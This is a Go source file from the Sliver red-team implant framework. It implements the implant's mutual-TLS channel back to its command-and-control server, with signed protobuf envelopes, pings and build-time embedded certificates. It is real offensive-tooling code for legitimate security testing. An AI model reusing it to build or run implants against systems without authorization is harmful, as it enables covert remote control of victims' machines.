package mtls

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeMTLS}}

import (
	"bytes"
	"crypto/ed25519"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os"
	"strings"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"golang.org/x/crypto/blake2b"
	"google.golang.org/protobuf/proto"
)

var (
	// PingInterval - Amount of time between in-band "pings"
	PingInterval = 2 * time.Minute

	// YamuxPreface - Magic bytes sent before yamux frames
	YamuxPreface = "SLIVER/YAMUX/1\n"

	// caCertPEM - PEM encoded CA certificate
	caCertPEM = `{{.Build.MtlsCACert}}`

	keyPEM  = `{{.Build.MtlsKey}}`
	certPEM = `{{.Build.MtlsCert}}`
)

const mtlsEnvelopeSigningSeedPrefix = "sliver-mtls-envelope-signing-v1:"

var (
	envelopeSigningOnce  sync.Once
	envelopeSigningErr   error
	envelopeSigningKeyID uint64
	envelopeSigningPriv  ed25519.PrivateKey
)

func mtlsEnvelopeSigningKey() (ed25519.PrivateKey, uint64, error) {
	envelopeSigningOnce.Do(func() {
		peerKeyPair := cryptography.GetPeerAgeKeyPair()
		// NOTE: This file is rendered with Go's text/template; avoid literal template
		// delimiters in string checks or the template parser will treat it as an action.
		if peerKeyPair == nil || peerKeyPair.Private == "" || strings.Contains(peerKeyPair.Private, ".Build.PeerPrivateKey") {
			envelopeSigningErr = errors.New("[mtls] missing peer private key")
			return
		}

		seed := sha256.Sum256([]byte(mtlsEnvelopeSigningSeedPrefix + peerKeyPair.Private))
		envelopeSigningPriv = ed25519.NewKeyFromSeed(seed[:])

		pub := envelopeSigningPriv.Public().(ed25519.PublicKey)
		digest := blake2b.Sum256(pub)
		envelopeSigningKeyID = binary.LittleEndian.Uint64(digest[:8])
	})

	return envelopeSigningPriv, envelopeSigningKeyID, envelopeSigningErr
}

// WriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the receiver can delimit messages properly
func WriteEnvelope(w io.Writer, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}

	signingKey, keyID, err := mtlsEnvelopeSigningKey()
	if err != nil {
		return err
	}
	rawSigBuf := make([]byte, cryptography.RawSigSize)
	binary.LittleEndian.PutUint16(rawSigBuf[:2], cryptography.EdDSA)
	binary.LittleEndian.PutUint64(rawSigBuf[2:10], keyID)
	copy(rawSigBuf[10:], ed25519.Sign(signingKey, data))
	if _, werr := w.Write(rawSigBuf); werr != nil {
		return werr
	}

	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	if _, werr := w.Write(dataLengthBuf.Bytes()); werr != nil {
		// {{if .Config.Debug}}
		log.Print("Error writing data length: ", werr)
		// {{end}}
		return werr
	}
	if _, werr := w.Write(data); werr != nil {
		// {{if .Config.Debug}}
		log.Print("Error writing data: ", werr)
		// {{end}}
		return werr
	}
	return nil
}

// WritePing - Send a "ping" message to the server
func WritePing(w io.Writer) error {
	// {{if .Config.Debug}}
	log.Print("Socket ping")
	// {{end}}

	// We don't need a real nonce here, we just need to write to the socket
	pingBuf, _ := proto.Marshal(&pb.Ping{Nonce: 31337})
	envelope := pb.Envelope{
		Type: pb.MsgPing,
		Data: pingBuf,
	}
	return WriteEnvelope(w, &envelope)
}

// ReadEnvelope - Reads a message from the TLS connection using length prefix framing
func ReadEnvelope(r io.Reader) (*pb.Envelope, error) {
	rawSigBuf := make([]byte, cryptography.RawSigSize)
	dataLengthBuf := make([]byte, 4) // Size of uint32
	if len(rawSigBuf) == 0 || len(dataLengthBuf) == 0 || r == nil {
		panic("[[GenerateCanary]]")
	}

	n, err := io.ReadFull(r, rawSigBuf)
	if err != nil || n != len(rawSigBuf) {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read raw signature): %v\n", err)
		// {{end}}
		return nil, err
	}

	n, err = io.ReadFull(r, dataLengthBuf)
	if err != nil || n != 4 {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	if dataLength <= 0 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] read error: %s\n", err)
		// {{end}}
		return nil, errors.New("[mtls] zero data length")
	}

	dataBuf := make([]byte, dataLength)

	n, err = io.ReadFull(r, dataBuf)

	if err != nil || n != dataLength {
		// {{if .Config.Debug}}
		log.Printf("Read error: %s\n", err)
		// {{end}}
		return nil, err
	}

	if !cryptography.MinisignVerifyRaw(dataBuf, rawSigBuf) {
		// {{if .Config.Debug}}
		log.Printf("Invalid signature on mtls envelope")
		// {{end}}
		return nil, errors.New("[mtls] invalid signature")
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshal envelope error: %v", err)
		// {{end}}
		return nil, err
	}

	return envelope, nil
}

// MtlsConnect - Get a TLS connection or die trying
func MtlsConnect(address string, port uint16) (*tls.Conn, error) {
	tlsConfig := getTLSConfig()
	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect: %v", err)
		// {{end}}
		return nil, err
	}
	return connection, nil
}

func getTLSConfig() *tls.Config {

	certPEM, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Cannot load sliver certificate: %v", err)
		// {{end}}
		os.Exit(5)
	}

	// Load CA cert
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM([]byte(caCertPEM))

	// Setup config with custom certificate validation routine
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{certPEM},
		RootCAs:            caCertPool,
		InsecureSkipVerify: true, // Don't worry I sorta know what I'm doing
		VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
			return cryptography.RootOnlyVerifyCertificate(caCertPEM, rawCerts, verifiedChains)
		},
	}
	// {{if .Config.Debug}}
	if cryptography.TLSKeyLogger != nil {
		tlsConfig.KeyLogWriter = cryptography.TLSKeyLogger
	}
	// {{end}}

	return tlsConfig
}

// {{end}} -IncludeMTLS
